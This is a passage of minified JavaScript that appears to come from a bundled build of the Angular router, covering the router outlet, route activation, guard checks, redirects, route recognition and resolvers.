      ngOnChanges(n) {
        if (n.name) {
          let { firstChange: r, previousValue: o } = n.name;
          if (r) return;
          this.isTrackedInParentContexts(o) &&
            (this.deactivate(), this.parentContexts.onChildOutletDestroyed(o)),
            this.initializeOutletWithName();
        }
      }
      ngOnDestroy() {
        this.isTrackedInParentContexts(this.name) &&
          this.parentContexts.onChildOutletDestroyed(this.name),
          this.inputBinder?.unsubscribeFromRouteData(this);
      }
      isTrackedInParentContexts(n) {
        return this.parentContexts.getContext(n)?.outlet === this;
      }
      ngOnInit() {
        this.initializeOutletWithName();
      }
      initializeOutletWithName() {
        if (
          (this.parentContexts.onChildOutletCreated(this.name, this),
          this.activated)
        )
          return;
        let n = this.parentContexts.getContext(this.name);
        n?.route &&
          (n.attachRef
            ? this.attach(n.attachRef, n.route)
            : this.activateWith(n.route, n.injector));
      }
      get isActivated() {
        return !!this.activated;
      }
      get component() {
        if (!this.activated) throw new D(4012, !1);
        return this.activated.instance;
      }
      get activatedRoute() {
        if (!this.activated) throw new D(4012, !1);
        return this._activatedRoute;
      }
      get activatedRouteData() {
        return this._activatedRoute ? this._activatedRoute.snapshot.data : {};
      }
      detach() {
        if (!this.activated) throw new D(4012, !1);
        this.location.detach();
        let n = this.activated;
        return (
          (this.activated = null),
          (this._activatedRoute = null),
          this.detachEvents.emit(n.instance),
          n
        );
      }
      attach(n, r) {
        (this.activated = n),
          (this._activatedRoute = r),
          this.location.insert(n.hostView),
          this.inputBinder?.bindActivatedRouteToOutletComponent(this),
          this.attachEvents.emit(n.instance);
      }
      deactivate() {
        if (this.activated) {
          let n = this.component;
          this.activated.destroy(),
            (this.activated = null),
            (this._activatedRoute = null),
            this.deactivateEvents.emit(n);
        }
      }
      activateWith(n, r) {
        if (this.isActivated) throw new D(4013, !1);
        this._activatedRoute = n;
        let o = this.location,
          a = n.snapshot.component,
          c = this.parentContexts.getOrCreateContext(this.name).children,
          l = new Iu(n, c, o.injector);
        (this.activated = o.createComponent(a, {
          index: o.length,
          injector: l,
          environmentInjector: r ?? this.environmentInjector,
        })),
          this.changeDetector.markForCheck(),
          this.inputBinder?.bindActivatedRouteToOutletComponent(this),
          this.activateEvents.emit(this.activated.instance);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵdir = be({
        type: e,
        selectors: [["router-outlet"]],
        inputs: { name: "name" },
        outputs: {
          activateEvents: "activate",
          deactivateEvents: "deactivate",
          attachEvents: "attach",
          detachEvents: "detach",
        },
        exportAs: ["outlet"],
        standalone: !0,
        features: [Dt],
      })),
      e
    );
  })(),
  Iu = class t {
    __ngOutletInjector(e) {
      return new t(this.route, this.childContexts, e);
    }
    constructor(e, i, n) {
      (this.route = e), (this.childContexts = i), (this.parent = n);
    }
    get(e, i) {
      return e === Cn
        ? this.route
        : e === Tr
        ? this.childContexts
        : this.parent.get(e, i);
    }
  },
  ca = new b(""),
  um = (() => {
    let e = class e {
      constructor() {
        this.outletDataSubscriptions = new Map();
      }
      bindActivatedRouteToOutletComponent(n) {
        this.unsubscribeFromRouteData(n), this.subscribeToRouteData(n);
      }
      unsubscribeFromRouteData(n) {
        this.outletDataSubscriptions.get(n)?.unsubscribe(),
          this.outletDataSubscriptions.delete(n);
      }
      subscribeToRouteData(n) {
        let { activatedRoute: r } = n,
          o = sn([r.queryParams, r.params, r.data])
            .pipe(
              xe(
                ([s, a, c], l) => (
                  (c = C(C(C({}, s), a), c)),
                  0 === l ? x(c) : Promise.resolve(c)
                )
              )
            )
            .subscribe((s) => {
              if (
                !n.isActivated ||
                !n.activatedComponentRef ||
                n.activatedRoute !== r ||
                null === r.component
              )
                return void this.unsubscribeFromRouteData(n);
              let a = Dg(r.component);
              if (a)
                for (let { templateName: c } of a.inputs)
                  n.activatedComponentRef.setInput(c, s[c]);
              else this.unsubscribeFromRouteData(n);
            });
        this.outletDataSubscriptions.set(n, o);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })();
function OD(t, e, i) {
  let n = Or(t, e._root, i ? i._root : void 0);
  return new na(n, e);
}
function Or(t, e, i) {
  if (i && t.shouldReuseRoute(e.value, i.value.snapshot)) {
    let n = i.value;
    n._futureSnapshot = e.value;
    let r = ID(t, e, i);
    return new Ae(n, r);
  }
  {
    if (t.shouldAttach(e.value)) {
      let o = t.retrieve(e.value);
      if (null !== o) {
        let s = o.route;
        return (
          (s.value._futureSnapshot = e.value),
          (s.children = e.children.map((a) => Or(t, a))),
          s
        );
      }
    }
    let n = PD(e.value),
      r = e.children.map((o) => Or(t, o));
    return new Ae(n, r);
  }
}
function ID(t, e, i) {
  return e.children.map((n) => {
    for (let r of i.children)
      if (t.shouldReuseRoute(n.value, r.value.snapshot)) return Or(t, n, r);
    return Or(t, n);
  });
}
function PD(t) {
  return new Cn(
    new le(t.url),
    new le(t.params),
    new le(t.queryParams),
    new le(t.fragment),
    new le(t.data),
    t.outlet,
    t.component,
    t
  );
}
var Tm = "ngNavigationCancelingError";
function Am(t, e) {
  let { redirectTo: i, navigationBehaviorOptions: n } = hi(e)
      ? { redirectTo: e, navigationBehaviorOptions: void 0 }
      : e,
    r = Rm(!1, Re.Redirect);
  return (r.url = i), (r.navigationBehaviorOptions = n), r;
}
function Rm(t, e) {
  let i = new Error(`NavigationCancelingError: ${t || ""}`);
  return (i[Tm] = !0), (i.cancellationCode = e), i;
}
function SD(t) {
  return Nm(t) && hi(t.url);
}
function Nm(t) {
  return !!t && t[Tm];
}
var TD = (() => {
  let e = class e {};
  return (
    (e.ɵfac = function (r) {
      return new (r || e)();
    }),
    (e.ɵcmp = he({
      type: e,
      selectors: [["ng-component"]],
      standalone: !0,
      features: [qt],
      decls: 1,
      vars: 0,
      template: function (r, o) {
        1 & r && B(0, "router-outlet");
      },
      dependencies: [ED],
      encapsulation: 2,
    })),
    e
  );
})();
function AD(t, e) {
  return (
    t.providers &&
      !t._injector &&
      (t._injector = Os(t.providers, e, `Route: ${t.path}`)),
    t._injector ?? e
  );
}
function Lu(t) {
  let e = t.children && t.children.map(Lu),
    i = e ? Z(C({}, t), { children: e }) : C({}, t);
  return (
    !i.component &&
      !i.loadComponent &&
      (e || i.loadChildren) &&
      i.outlet &&
      i.outlet !== A &&
      (i.component = TD),
    i
  );
}
function vt(t) {
  return t.outlet || A;
}
function RD(t, e) {
  let i = t.filter((n) => vt(n) === e);
  return i.push(...t.filter((n) => vt(n) !== e)), i;
}
function Ar(t) {
  if (!t) return null;
  if (t.routeConfig?._injector) return t.routeConfig._injector;
  for (let e = t.parent; e; e = e.parent) {
    let i = e.routeConfig;
    if (i?._loadedInjector) return i._loadedInjector;
    if (i?._injector) return i._injector;
  }
  return null;
}
var ND = (t, e, i, n) =>
    F(
      (r) => (
        new Pu(e, r.targetRouterState, r.currentRouterState, i, n).activate(t),
        r
      )
    ),
  Pu = class {
    constructor(e, i, n, r, o) {
      (this.routeReuseStrategy = e),
        (this.futureState = i),
        (this.currState = n),
        (this.forwardEvent = r),
        (this.inputBindingEnabled = o);
    }
    activate(e) {
      let i = this.futureState._root,
        n = this.currState ? this.currState._root : null;
      this.deactivateChildRoutes(i, n, e),
        au(this.futureState.root),
        this.activateChildRoutes(i, n, e);
    }
    deactivateChildRoutes(e, i, n) {
      let r = li(i);
      e.children.forEach((o) => {
        let s = o.value.outlet;
        this.deactivateRoutes(o, r[s], n), delete r[s];
      }),
        Object.values(r).forEach((o) => {
          this.deactivateRouteAndItsChildren(o, n);
        });
    }
    deactivateRoutes(e, i, n) {
      let r = e.value,
        o = i ? i.value : null;
      if (r === o)
        if (r.component) {
          let s = n.getContext(r.outlet);
          s && this.deactivateChildRoutes(e, i, s.children);
        } else this.deactivateChildRoutes(e, i, n);
      else o && this.deactivateRouteAndItsChildren(i, n);
    }
    deactivateRouteAndItsChildren(e, i) {
      e.value.component &&
      this.routeReuseStrategy.shouldDetach(e.value.snapshot)
        ? this.detachAndStoreRouteSubtree(e, i)
        : this.deactivateRouteAndOutlet(e, i);
    }
    detachAndStoreRouteSubtree(e, i) {
      let n = i.getContext(e.value.outlet),
        r = n && e.value.component ? n.children : i,
        o = li(e);
      for (let s of Object.values(o)) this.deactivateRouteAndItsChildren(s, r);
      if (n && n.outlet) {
        let s = n.outlet.detach(),
          a = n.children.onOutletDeactivated();
        this.routeReuseStrategy.store(e.value.snapshot, {
          componentRef: s,
          route: e,
          contexts: a,
        });
      }
    }
    deactivateRouteAndOutlet(e, i) {
      let n = i.getContext(e.value.outlet),
        r = n && e.value.component ? n.children : i,
        o = li(e);
      for (let s of Object.values(o)) this.deactivateRouteAndItsChildren(s, r);
      n &&
        (n.outlet && (n.outlet.deactivate(), n.children.onOutletDeactivated()),
        (n.attachRef = null),
        (n.route = null));
    }
    activateChildRoutes(e, i, n) {
      let r = li(i);
      e.children.forEach((o) => {
        this.activateRoutes(o, r[o.value.outlet], n),
          this.forwardEvent(new Mu(o.value.snapshot));
      }),
        e.children.length && this.forwardEvent(new wu(e.value.snapshot));
    }
    activateRoutes(e, i, n) {
      let r = e.value,
        o = i ? i.value : null;
      if ((au(r), r === o))
        if (r.component) {
          let s = n.getOrCreateContext(r.outlet);
          this.activateChildRoutes(e, i, s.children);
        } else this.activateChildRoutes(e, i, n);
      else if (r.component) {
        let s = n.getOrCreateContext(r.outlet);
        if (this.routeReuseStrategy.shouldAttach(r.snapshot)) {
          let a = this.routeReuseStrategy.retrieve(r.snapshot);
          this.routeReuseStrategy.store(r.snapshot, null),
            s.children.onOutletReAttached(a.contexts),
            (s.attachRef = a.componentRef),
            (s.route = a.route.value),
            s.outlet && s.outlet.attach(a.componentRef, a.route.value),
            au(a.route.value),
            this.activateChildRoutes(e, null, s.children);
        } else {
          let a = Ar(r.snapshot);
          (s.attachRef = null),
            (s.route = r),
            (s.injector = a),
            s.outlet && s.outlet.activateWith(r, s.injector),
            this.activateChildRoutes(e, null, s.children);
        }
      } else this.activateChildRoutes(e, null, n);
    }
  },
  ra = class {
    constructor(e) {
      (this.path = e), (this.route = this.path[this.path.length - 1]);
    }
  },
  di = class {
    constructor(e, i) {
      (this.component = e), (this.route = i);
    }
  };
function kD(t, e, i) {
  let n = t._root;
  return mr(n, e ? e._root : null, i, [n.value]);
}
function FD(t) {
  let e = t.routeConfig ? t.routeConfig.canActivateChild : null;
  return e && 0 !== e.length ? { node: t, guards: e } : null;
}
function mi(t, e) {
  let i = Symbol(),
    n = e.get(t, i);
  return n === i ? ("function" != typeof t || Kf(t) ? e.get(t) : t) : n;
}
function mr(
  t,
  e,
  i,
  n,
  r = { canDeactivateChecks: [], canActivateChecks: [] }
) {
  let o = li(e);
  return (
    t.children.forEach((s) => {
      LD(s, o[s.value.outlet], i, n.concat([s.value]), r),
        delete o[s.value.outlet];
    }),
    Object.entries(o).forEach(([s, a]) => Cr(a, i.getContext(s), r)),
    r
  );
}
function LD(
  t,
  e,
  i,
  n,
  r = { canDeactivateChecks: [], canActivateChecks: [] }
) {
  let o = t.value,
    s = e ? e.value : null,
    a = i ? i.getContext(t.value.outlet) : null;
  if (s && o.routeConfig === s.routeConfig) {
    let c = jD(s, o, o.routeConfig.runGuardsAndResolvers);
    c
      ? r.canActivateChecks.push(new ra(n))
      : ((o.data = s.data), (o._resolvedData = s._resolvedData)),
      o.component ? mr(t, e, a ? a.children : null, n, r) : mr(t, e, i, n, r),
      c &&
        a &&
        a.outlet &&
        a.outlet.isActivated &&
        r.canDeactivateChecks.push(new di(a.outlet.component, s));
  } else
    s && Cr(e, a, r),
      r.canActivateChecks.push(new ra(n)),
      o.component
        ? mr(t, null, a ? a.children : null, n, r)
        : mr(t, null, i, n, r);
  return r;
}
function jD(t, e, i) {
  if ("function" == typeof i) return i(t, e);
  switch (i) {
    case "pathParamsChange":
      return !yn(t.url, e.url);
    case "pathParamsOrQueryParamsChange":
      return !yn(t.url, e.url) || !gt(t.queryParams, e.queryParams);
    case "always":
      return !0;
    case "paramsOrQueryParamsChange":
      return !Ou(t, e) || !gt(t.queryParams, e.queryParams);
    default:
      return !Ou(t, e);
  }
}
function Cr(t, e, i) {
  let n = li(t),
    r = t.value;
  Object.entries(n).forEach(([o, s]) => {
    r.component ? Cr(s, e ? e.children.getContext(o) : null, i) : Cr(s, e, i);
  }),
    r.component && e && e.outlet && e.outlet.isActivated
      ? i.canDeactivateChecks.push(new di(e.outlet.component, r))
      : i.canDeactivateChecks.push(new di(null, r));
}
function Rr(t) {
  return "function" == typeof t;
}
function VD(t) {
  return "boolean" == typeof t;
}
function BD(t) {
  return t && Rr(t.canLoad);
}
function UD(t) {
  return t && Rr(t.canActivate);
}
function $D(t) {
  return t && Rr(t.canActivateChild);
}
function HD(t) {
  return t && Rr(t.canDeactivate);
}
function zD(t) {
  return t && Rr(t.canMatch);
}
function km(t) {
  return t instanceof yt || "EmptyError" === t?.name;
}
var Gs = Symbol("INITIAL_VALUE");
function gi() {
  return xe((t) =>
    sn(t.map((e) => e.pipe(ue(1), ot(Gs)))).pipe(
      F((e) => {
        for (let i of e)
          if (!0 !== i) {
            if (i === Gs) return Gs;
            if (!1 === i || i instanceof Zt) return i;
          }
        return !0;
      }),
      Q((e) => e !== Gs),
      ue(1)
    )
  );
}
function WD(t, e) {
  return ie((i) => {
    let {
      targetSnapshot: n,
      currentSnapshot: r,
      guards: { canActivateChecks: o, canDeactivateChecks: s },
    } = i;
    return 0 === s.length && 0 === o.length
      ? x(Z(C({}, i), { guardsResult: !0 }))
      : GD(s, n, r, t).pipe(
          ie((a) => (a && VD(a) ? qD(n, o, t, e) : x(a))),
          F((a) => Z(C({}, i), { guardsResult: a }))
        );
  });
}
function GD(t, e, i, n) {
  return ee(t).pipe(
    ie((r) => XD(r.component, r.route, i, e, n)),
    Ge((r) => !0 !== r, !0)
  );
}
function qD(t, e, i, n) {
  return ee(e).pipe(
    Ft((r) =>
      Rt(
        ZD(r.route.parent, n),
        YD(r.route, n),
        KD(t, r.path, i),
        QD(t, r.route, i)
      )
    ),
    Ge((r) => !0 !== r, !0)
  );
}
function YD(t, e) {
  return null !== t && e && e(new bu(t)), x(!0);
}
function ZD(t, e) {
  return null !== t && e && e(new Cu(t)), x(!0);
}
function QD(t, e, i) {
  let n = e.routeConfig ? e.routeConfig.canActivate : null;
  return n && 0 !== n.length
    ? x(
        n.map((o) =>
          Nt(() => {
            let s = Ar(e) ?? i,
              a = mi(o, s);
            return Jt(UD(a) ? a.canActivate(e, t) : dt(s, () => a(e, t))).pipe(
              Ge()
            );
          })
        )
      ).pipe(gi())
    : x(!0);
}
function KD(t, e, i) {
  let n = e[e.length - 1],
    o = e
      .slice(0, e.length - 1)
      .reverse()
      .map((s) => FD(s))
      .filter((s) => null !== s)
      .map((s) =>
        Nt(() =>
          x(
            s.guards.map((c) => {
              let l = Ar(s.node) ?? i,
                u = mi(c, l);
              return Jt(
                $D(u) ? u.canActivateChild(n, t) : dt(l, () => u(n, t))
              ).pipe(Ge());
            })
          ).pipe(gi())
        )
      );
  return x(o).pipe(gi());
}
function XD(t, e, i, n, r) {
  let o = e && e.routeConfig ? e.routeConfig.canDeactivate : null;
  return o && 0 !== o.length
    ? x(
        o.map((a) => {
          let c = Ar(e) ?? r,
            l = mi(a, c);
          return Jt(
            HD(l) ? l.canDeactivate(t, e, i, n) : dt(c, () => l(t, e, i, n))
          ).pipe(Ge());
        })
      ).pipe(gi())
    : x(!0);
}
function JD(t, e, i, n) {
  let r = e.canLoad;
  return void 0 === r || 0 === r.length
    ? x(!0)
    : x(
        r.map((s) => {
          let a = mi(s, t);
          return Jt(BD(a) ? a.canLoad(e, i) : dt(t, () => a(e, i)));
        })
      ).pipe(gi(), Fm(n));
}
function Fm(t) {
  return Ta(
    ce((e) => {
      if (hi(e)) throw Am(t, e);
    }),
    F((e) => !0 === e)
  );
}
function ex(t, e, i, n) {
  let r = e.canMatch;
  return r && 0 !== r.length
    ? x(
        r.map((s) => {
          let a = mi(s, t);
          return Jt(zD(a) ? a.canMatch(e, i) : dt(t, () => a(e, i)));
        })
      ).pipe(gi(), Fm(n))
    : x(!0);
}
var Ir = class {
    constructor(e) {
      this.segmentGroup = e || null;
    }
  },
  oa = class extends Error {
    constructor(e) {
      super(), (this.urlTree = e);
    }
  };
function ci(t) {
  return jn(new Ir(t));
}
function tx(t) {
  return jn(new D(4e3, !1));
}
function nx(t) {
  return jn(Rm(!1, Re.GuardRejected));
}
var Su = class {
    constructor(e, i) {
      (this.urlSerializer = e), (this.urlTree = i);
    }
    lineralizeSegments(e, i) {
      let n = [],
        r = i.root;
      for (;;) {
        if (((n = n.concat(r.segments)), 0 === r.numberOfChildren)) return x(n);
        if (r.numberOfChildren > 1 || !r.children[A]) return tx(e.redirectTo);
        r = r.children[A];
      }
    }
    applyRedirectCommands(e, i, n) {
      let r = this.applyRedirectCreateUrlTree(
        i,
        this.urlSerializer.parse(i),
        e,
        n
      );
      if (i.startsWith("/")) throw new oa(r);
      return r;
    }
    applyRedirectCreateUrlTree(e, i, n, r) {
      let o = this.createSegmentGroup(e, i.root, n, r);
      return new Zt(
        o,
        this.createQueryParams(i.queryParams, this.urlTree.queryParams),
        i.fragment
      );
    }
    createQueryParams(e, i) {
      let n = {};
      return (
        Object.entries(e).forEach(([r, o]) => {
          if ("string" == typeof o && o.startsWith(":")) {
            let a = o.substring(1);
            n[r] = i[a];
          } else n[r] = o;
        }),
        n
      );
    }
    createSegmentGroup(e, i, n, r) {
      let o = this.createSegments(e, i.segments, n, r),
        s = {};
      return (
        Object.entries(i.children).forEach(([a, c]) => {
          s[a] = this.createSegmentGroup(e, c, n, r);
        }),
        new W(o, s)
      );
    }
    createSegments(e, i, n, r) {
      return i.map((o) =>
        o.path.startsWith(":")
          ? this.findPosParam(e, o, r)
          : this.findOrReturn(o, n)
      );
    }
    findPosParam(e, i, n) {
      let r = n[i.path.substring(1)];
      if (!r) throw new D(4001, !1);
      return r;
    }
    findOrReturn(e, i) {
      let n = 0;
      for (let r of i) {
        if (r.path === e.path) return i.splice(n), r;
        n++;
      }
      return e;
    }
  },
  Tu = {
    matched: !1,
    consumedSegments: [],
    remainingSegments: [],
    parameters: {},
    positionalParamSegments: {},
  };
function ix(t, e, i, n, r) {
  let o = ju(t, e, i);
  return o.matched
    ? ex((n = AD(e, n)), e, i, r).pipe(F((s) => (!0 === s ? o : C({}, Tu))))
    : x(o);
}
function ju(t, e, i) {
  if ("**" === e.path) return rx(i);
  if ("" === e.path)
    return "full" === e.pathMatch && (t.hasChildren() || i.length > 0)
      ? C({}, Tu)
      : {
          matched: !0,
          consumedSegments: [],
          remainingSegments: i,
          parameters: {},
          positionalParamSegments: {},
        };
  let r = (e.matcher || JM)(i, t, e);
  if (!r) return C({}, Tu);
  let o = {};
  Object.entries(r.posParams ?? {}).forEach(([a, c]) => {
    o[a] = c.path;
  });
  let s =
    r.consumed.length > 0
      ? C(C({}, o), r.consumed[r.consumed.length - 1].parameters)
      : o;
  return {
    matched: !0,
    consumedSegments: r.consumed,
    remainingSegments: i.slice(r.consumed.length),
    parameters: s,
    positionalParamSegments: r.posParams ?? {},
  };
}
function rx(t) {
  return {
    matched: !0,
    parameters: t.length > 0 ? gm(t).parameters : {},
    consumedSegments: t,
    remainingSegments: [],
    positionalParamSegments: {},
  };
}
function dm(t, e, i, n) {
  return i.length > 0 && ax(t, i, n)
    ? {
        segmentGroup: new W(e, sx(n, new W(i, t.children))),
        slicedSegments: [],
      }
    : 0 === i.length && cx(t, i, n)
    ? {
        segmentGroup: new W(t.segments, ox(t, i, n, t.children)),
        slicedSegments: i,
      }
    : { segmentGroup: new W(t.segments, t.children), slicedSegments: i };
}
function ox(t, e, i, n) {
  let r = {};
  for (let o of i)
    if (la(t, e, o) && !n[vt(o)]) {
      let s = new W([], {});
      r[vt(o)] = s;
    }
  return C(C({}, n), r);
}
function sx(t, e) {
  let i = {};
  i[A] = e;
  for (let n of t)
    if ("" === n.path && vt(n) !== A) {
      let r = new W([], {});
      i[vt(n)] = r;
    }
  return i;
}
function ax(t, e, i) {
  return i.some((n) => la(t, e, n) && vt(n) !== A);
}
function cx(t, e, i) {
  return i.some((n) => la(t, e, n));
}
function la(t, e, i) {
  return (
    (!(t.hasChildren() || e.length > 0) || "full" !== i.pathMatch) &&
    "" === i.path
  );
}
function lx(t, e, i, n) {
  return !!(vt(t) === n || (n !== A && la(e, i, t))) && ju(e, t, i).matched;
}
function ux(t, e, i) {
  return 0 === e.length && !t.children[i];
}
var Au = class {};
function dx(t, e, i, n, r, o, s = "emptyOnly") {
  return new Ru(t, e, i, n, r, s, o).recognize();
}
var fx = 31,
  Ru = class {
    constructor(e, i, n, r, o, s, a) {
      (this.injector = e),
        (this.configLoader = i),
        (this.rootComponentType = n),
        (this.config = r),
        (this.urlTree = o),
        (this.paramsInheritanceStrategy = s),
        (this.urlSerializer = a),
        (this.applyRedirects = new Su(this.urlSerializer, this.urlTree)),
        (this.absoluteRedirectCount = 0),
        (this.allowRedirects = !0);
    }
    noMatchError(e) {
      return new D(4002, `'${e.segmentGroup}'`);
    }
    recognize() {
      let e = dm(this.urlTree.root, [], [], this.config).segmentGroup;
      return this.match(e).pipe(
        F((i) => {
          let n = new Er(
              [],
              Object.freeze({}),
              Object.freeze(C({}, this.urlTree.queryParams)),
              this.urlTree.fragment,
              {},
              A,
              this.rootComponentType,
              null,
              {}
            ),
            r = new Ae(n, i),
            o = new ia("", r),
            s = _D(n, [], this.urlTree.queryParams, this.urlTree.fragment);
          return (
            (s.queryParams = this.urlTree.queryParams),
            (o.url = this.urlSerializer.serialize(s)),
            this.inheritParamsAndData(o._root, null),
            { state: o, tree: s }
          );
        })
      );
    }
    match(e) {
      return this.processSegmentGroup(this.injector, this.config, e, A).pipe(
        kt((n) => {
          if (n instanceof oa)
            return (this.urlTree = n.urlTree), this.match(n.urlTree.root);
          throw n instanceof Ir ? this.noMatchError(n) : n;
        })
      );
    }
    inheritParamsAndData(e, i) {
      let n = e.value,
        r = ku(n, i, this.paramsInheritanceStrategy);
      (n.params = Object.freeze(r.params)),
        (n.data = Object.freeze(r.data)),
        e.children.forEach((o) => this.inheritParamsAndData(o, n));
    }
    processSegmentGroup(e, i, n, r) {
      return 0 === n.segments.length && n.hasChildren()
        ? this.processChildren(e, i, n)
        : this.processSegment(e, i, n, n.segments, r, !0).pipe(
            F((o) => (o instanceof Ae ? [o] : []))
          );
    }
    processChildren(e, i, n) {
      let r = [];
      for (let o of Object.keys(n.children))
        "primary" === o ? r.unshift(o) : r.push(o);
      return ee(r).pipe(
        Ft((o) => {
          let s = n.children[o],
            a = RD(i, o);
          return this.processSegmentGroup(e, a, s, o);
        }),
        Va((o, s) => (o.push(...s), o)),
        Lt(null),
        ja(),
        ie((o) => {
          if (null === o) return ci(n);
          let s = Lm(o);
          return hx(s), x(s);
        })
      );
    }
    processSegment(e, i, n, r, o, s) {
      return ee(i).pipe(
        Ft((a) =>
          this.processSegmentAgainstRoute(
            a._injector ?? e,
            i,
            a,
            n,
            r,
            o,
            s
          ).pipe(
            kt((c) => {
              if (c instanceof Ir) return x(null);
              throw c;
            })
          )
        ),
        Ge((a) => !!a),
        kt((a) => {
          if (km(a)) return ux(n, r, o) ? x(new Au()) : ci(n);
          throw a;
        })
      );
    }
    processSegmentAgainstRoute(e, i, n, r, o, s, a) {
      return lx(n, r, o, s)
        ? void 0 === n.redirectTo
          ? this.matchSegmentAgainstRoute(e, r, n, o, s)
          : this.allowRedirects && a
          ? this.expandSegmentAgainstRouteUsingRedirect(e, r, i, n, o, s)
          : ci(r)
        : ci(r);
    }
    expandSegmentAgainstRouteUsingRedirect(e, i, n, r, o, s) {
      let {
        matched: a,
        consumedSegments: c,
        positionalParamSegments: l,
        remainingSegments: u,
      } = ju(i, r, o);
      if (!a) return ci(i);
      r.redirectTo.startsWith("/") &&
        (this.absoluteRedirectCount++,
        this.absoluteRedirectCount > fx && (this.allowRedirects = !1));
      let d = this.applyRedirects.applyRedirectCommands(c, r.redirectTo, l);
      return this.applyRedirects
        .lineralizeSegments(r, d)
        .pipe(ie((f) => this.processSegment(e, n, i, f.concat(u), s, !1)));
    }
    matchSegmentAgainstRoute(e, i, n, r, o) {
      let s = ix(i, n, r, e, this.urlSerializer);
      return (
        "**" === n.path && (i.children = {}),
        s.pipe(
          xe((a) =>
            a.matched
              ? ((e = n._injector ?? e),
                this.getChildConfig(e, n, r).pipe(
                  xe(({ routes: c }) => {
                    let l = n._loadedInjector ?? e,
                      {
                        consumedSegments: u,
                        remainingSegments: d,
                        parameters: f,
                      } = a,
                      m = new Er(
                        u,
                        f,
                        Object.freeze(C({}, this.urlTree.queryParams)),
                        this.urlTree.fragment,
                        gx(n),
                        vt(n),
                        n.component ?? n._loadedComponent ?? null,
                        n,
                        mx(n)
                      ),
                      { segmentGroup: w, slicedSegments: M } = dm(i, u, d, c);
                    if (0 === M.length && w.hasChildren())
                      return this.processChildren(l, c, w).pipe(
                        F((H) => (null === H ? null : new Ae(m, H)))
                      );
                    if (0 === c.length && 0 === M.length)
                      return x(new Ae(m, []));
                    let G = vt(n) === o;
                    return this.processSegment(l, c, w, M, G ? A : o, !0).pipe(
                      F((H) => new Ae(m, H instanceof Ae ? [H] : []))
                    );
                  })
                ))
              : ci(i)
          )
        )
      );
    }
    getChildConfig(e, i, n) {
      return i.children
        ? x({ routes: i.children, injector: e })
        : i.loadChildren
        ? void 0 !== i._loadedRoutes
          ? x({ routes: i._loadedRoutes, injector: i._loadedInjector })
          : JD(e, i, n, this.urlSerializer).pipe(
              ie((r) =>
                r
                  ? this.configLoader.loadChildren(e, i).pipe(
                      ce((o) => {
                        (i._loadedRoutes = o.routes),
                          (i._loadedInjector = o.injector);
                      })
                    )
                  : nx(i)
              )
            )
        : x({ routes: [], injector: e });
    }
  };
function hx(t) {
  t.sort((e, i) =>
    e.value.outlet === A
      ? -1
      : i.value.outlet === A
      ? 1
      : e.value.outlet.localeCompare(i.value.outlet)
  );
}
function px(t) {
  let e = t.value.routeConfig;
  return e && "" === e.path;
}
function Lm(t) {
  let e = [],
    i = new Set();
  for (let n of t) {
    if (!px(n)) {
      e.push(n);
      continue;
    }
    let r = e.find((o) => n.value.routeConfig === o.value.routeConfig);
    void 0 !== r ? (r.children.push(...n.children), i.add(r)) : e.push(n);
  }
  for (let n of i) {
    let r = Lm(n.children);
    e.push(new Ae(n.value, r));
  }
  return e.filter((n) => !i.has(n));
}
function gx(t) {
  return t.data || {};
}
function mx(t) {
  return t.resolve || {};
}
function vx(t, e, i, n, r, o) {
  return ie((s) =>
    dx(t, e, i, n, s.extractedUrl, r, o).pipe(
      F(({ state: a, tree: c }) =>
        Z(C({}, s), { targetSnapshot: a, urlAfterRedirects: c })
      )
    )
  );
}
function _x(t, e) {
  return ie((i) => {
    let {
      targetSnapshot: n,
      guards: { canActivateChecks: r },
    } = i;
    if (!r.length) return x(i);
    let o = new Set(r.map((c) => c.route)),
      s = new Set();
    for (let c of o) if (!s.has(c)) for (let l of jm(c)) s.add(l);
    let a = 0;
    return ee(s).pipe(
      Ft((c) =>
        o.has(c)
          ? yx(c, n, t, e)
          : ((c.data = ku(c, c.parent, t).resolve), x(void 0))
      ),
      ce(() => a++),
      Bn(1),
      ie((c) => (a === s.size ? x(i) : ye))
    );
  });
}
function jm(t) {
  let e = t.children.map((i) => jm(i)).flat();
  return [t, ...e];
}
function yx(t, e, i, n) {
  let r = t.routeConfig,
    o = t._resolve;
  return (
    void 0 !== r?.title && !Sm(r) && (o[Pr] = r.title),
    Cx(o, t, e, n).pipe(
      F(
        (s) => (
          (t._resolvedData = s), (t.data = ku(t, t.parent, i).resolve), null
        )
      )
    )
  );
}
function Cx(t, e, i, n) {
  let r = uu(t);
  if (0 === r.length) return x({});
  let o = {};
  return ee(r).pipe(
    ie((s) =>
      wx(t[s], e, i, n).pipe(
        Ge(),
        ce((a) => {
          o[s] = a;
        })
      )
    ),
    Bn(1),
    La(o),
    kt((s) => (km(s) ? ye : jn(s)))
  );
}
function wx(t, e, i, n) {
  let r = Ar(e) ?? n,
    o = mi(t, r);
  return Jt(o.resolve ? o.resolve(e, i) : dt(r, () => o(e, i)));
}
function cu(t) {
  return xe((e) => {
    let i = t(e);
    return i ? ee(i).pipe(F(() => e)) : x(e);
  });
}
var Vm = (() => {
    let e = class e {
      buildTitle(n) {
        let r,
          o = n.root;
        for (; void 0 !== o; )
          (r = this.getResolvedTitleForRoute(o) ?? r),
            (o = o.children.find((s) => s.outlet === A));
        return r;
      }
      getResolvedTitleForRoute(n) {
        return n.data[Pr];
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: () => v(bx), providedIn: "root" })),
      e
    );
  })(),
  bx = (() => {
    let e = class e extends Vm {
      constructor(n) {
        super(), (this.title = n);
      }
      updateTitle(n) {
        let r = this.buildTitle(n);
        void 0 !== r && this.title.setTitle(r);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(im));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  Nr = new b("", { providedIn: "root", factory: () => ({}) }),
  sa = new b(""),
  Vu = (() => {
    let e = class e {
      constructor() {
        (this.componentLoaders = new WeakMap()),
          (this.childrenLoaders = new WeakMap()),
          (this.compiler = v(ks));
      }
      loadComponent(n) {
        if (this.componentLoaders.get(n)) return this.componentLoaders.get(n);
        if (n._loadedComponent) return x(n._loadedComponent);
        this.onLoadStartListener && this.onLoadStartListener(n);
        let r = Jt(n.loadComponent()).pipe(
            F(Bm),
            ce((s) => {
